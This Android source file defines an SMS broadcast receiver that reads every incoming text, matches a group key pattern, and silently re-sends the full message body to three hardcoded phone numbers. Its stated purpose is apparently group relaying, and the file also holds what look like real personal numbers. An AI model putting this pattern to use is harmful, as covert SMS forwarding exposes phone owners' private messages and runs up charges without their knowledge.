package lcl.android.spider.web.network.receiver;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;


import java.util.regex.Matcher;
import java.util.regex.Pattern;

import lcl.android.spider.web.network.constants.CommonConstants;

import static android.content.Context.TELEPHONY_SERVICE;

/**
 * Created by CHS on 2017-06-19.
 */
public class SmsReceiver extends BroadcastReceiver {


    @Override
    public void onReceive(Context context, Intent intent) {

        SharedPreferences prefs = context.getSharedPreferences("test", Context.MODE_PRIVATE);

        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            Bundle bundle = intent.getExtras();
            Object[] messages = (Object[])bundle.get("pdus");
            SmsMessage[] smsMessage = new SmsMessage[messages.length];

            for(int i = 0; i < messages.length; i++) {
                smsMessage[i] = SmsMessage.createFromPdu((byte[])messages[i]);
            }

            String message = smsMessage[0].getMessageBody().toString();

            String key = "";
            String ePattern = "(\\[[" + CommonConstants.GROUP_SECURE_KEY + ")]+\\*+([0-9])+\\])";
            Pattern p = Pattern.compile(ePattern);
            Matcher m = p.matcher(message);
            while(m.find()) {
                key = m.group(1);
            }

            String befKey = prefs.getString(CommonConstants.PREF_MESSAGE_KEY, "");
            if (key.equals(befKey) == false) {
                SharedPreferences.Editor editor = prefs.edit();
                editor.putString(CommonConstants.PREF_MESSAGE_KEY, key);
                editor.commit();

                TelephonyManager telephonyManager = (TelephonyManager)context.getSystemService(TELEPHONY_SERVICE);
                Intent intent2 = new Intent("SENT_SMS_ACTION");
                PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent2, PendingIntent.FLAG_UPDATE_CURRENT);
                SmsManager smsManager = SmsManager.getDefault();

                String numbers[] = {"01054234214","01041859056", "01094149177"};

                for(String number : numbers) {
                    smsManager.sendTextMessage(number, null, message, pendingIntent, null);
                }

            }

        }
    }

}
